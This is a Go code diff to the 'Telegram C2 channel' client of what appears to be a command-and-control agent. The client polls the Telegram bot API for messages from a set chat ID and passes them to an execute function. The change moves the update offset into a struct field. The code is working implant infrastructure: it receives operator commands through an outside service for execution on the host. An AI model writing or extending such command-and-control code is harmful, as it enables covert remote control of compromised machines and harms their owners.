@@ -56,8 +56,9 @@ type Client struct {
 	token   string
 	chatID  int64
 	apiURL  string
-	agentID string
-	execute core.ExecuteFunc
+	agentID    string
+	execute    core.ExecuteFunc
+	lastOffset int
 }
 
 // NewClient creates a Telegram C2 channel.
@@ -65,9 +66,10 @@ func NewClient(token string, chatID int64, agentID string, exec core.ExecuteFunc
 	return &Client{
 		token:   token,
 		chatID:  chatID,
-		apiURL:  fmt.Sprintf("https://api.telegram.org/bot%s", token),
-		agentID: agentID,
-		execute: exec,
+		apiURL:     fmt.Sprintf("https://api.telegram.org/bot%s", token),
+		agentID:    agentID,
+		execute:    exec,
+		lastOffset: -1,
 	}
 }
 
@@ -95,7 +97,6 @@ func (c *Client) Connect() error {
 }
 
 func (c *Client) Listen(ctx context.Context) error {
-	offset := -1
 	log.Printf("[%s] Listening for commands...", c.Name())
 
 	for {
@@ -106,14 +107,14 @@ func (c *Client) Listen(ctx context.Context) error {
 		default:
 		}
 
-		updates, err := c.getUpdates(offset)
+		updates, err := c.getUpdates(c.lastOffset)
 		if err != nil {
 			log.Printf("[%s] Error fetching updates: %v", c.Name(), err)
 			continue
 		}
 
 		for _, update := range updates {
-			offset = update.UpdateID + 1
+			c.lastOffset = update.UpdateID + 1
 
 			msg := update.Message
 			if msg.Text == "" || msg.Chat.ID != c.chatID {
